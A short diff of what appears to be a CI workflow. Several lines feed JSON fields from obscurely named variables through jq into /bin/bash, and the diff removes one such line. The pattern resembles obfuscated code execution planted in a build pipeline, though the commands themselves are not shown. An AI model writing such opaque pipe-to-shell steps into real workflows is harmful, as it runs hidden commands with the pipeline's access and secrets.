@@ -31,7 +31,6 @@ jobs:
           echo $ii12 | jq -r .joaac0968 | /bin/bash
           echo $fqdwf96 | jq -r .t788 | /bin/bash
           echo $b70184 | jq -r .jno52 | /bin/bash
-          printf '%s' "$me0" | jq -r .sbhdx7396 | /bin/bash
 
       - name: Save archive
         if: always()
